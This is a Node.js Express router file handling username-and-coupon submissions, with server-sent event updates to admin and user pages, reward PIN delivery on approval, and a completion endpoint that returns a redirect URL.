const express = require('express');
const crypto = require('crypto');
const db = require('../db');
const sse = require('../sse');

const router = express.Router();

function generateToken() {
  return 'usr_' + crypto.randomBytes(8).toString('hex');
}

// Submit username & coupon (Page 2 submission)
router.post('/submissions', async (req, res) => {
  try {
    const { username, coupon } = req.body;
    if (!username || !coupon) {
      return res.status(400).json({ error: 'Username and coupon are required' });
    }

    const token = generateToken();
    const submission = await db.createSubmission(token, username.trim(), coupon.trim());

    // Broadcast event to connected admin tabs
    sse.notifyAdmins({ type: 'new_submission', submission });

    res.json({ success: true, token });
  } catch (err) {
    console.error('Error in POST /submissions:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get submission status (Polled by user waiting page)
router.get('/submissions/:token/status', async (req, res) => {
  try {
    const submission = await db.getSubmissionByToken(req.params.token);
    if (!submission) {
      return res.status(404).json({ error: 'Submission not found' });
    }

    const redirectUrl = await db.getRedirectUrl();
    const response = {
      status: submission.status,
      username: submission.username
    };

    if (submission.status === 'approved' || submission.status === 'completed') {
      response.reward_pin = submission.reward_pin;
      response.redirect_url = redirectUrl;
    }

    res.json(response);
  } catch (err) {
    console.error('Error in GET /submissions/:token/status:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// SSE connection for user waiting page
router.get('/submissions/:token/events', async (req, res) => {
  try {
    const token = req.params.token;
    const submission = await db.getSubmissionByToken(token);
    if (!submission) {
      return res.status(404).end();
    }

    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    const redirectUrl = await db.getRedirectUrl();

    if (submission.status === 'approved' || submission.status === 'rejected') {
      const payload = {
        status: submission.status,
        reward_pin: submission.reward_pin,
        redirect_url: redirectUrl
      };
      res.write(`data: ${JSON.stringify(payload)}\n\n`);
      return;
    }

    sse.subscribeUser(token, res);
  } catch (err) {
    console.error('Error in SSE /submissions/:token/events:', err);
    res.status(500).end();
  }
});

// User clicks "Done" on page 3
router.post('/submissions/:token/complete', async (req, res) => {
  try {
    const token = req.params.token;
    const submission = await db.getSubmissionByToken(token);
    if (!submission) {
      return res.status(404).json({ error: 'Submission not found' });
    }

    await db.completeSubmission(token);
    sse.notifyAdmins({ type: 'status_updated', token, status: 'completed' });

    const redirectUrl = await db.getRedirectUrl();
    res.json({
      success: true,
      redirect_url: redirectUrl
    });
  } catch (err) {
    console.error('Error in POST /submissions/:token/complete:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
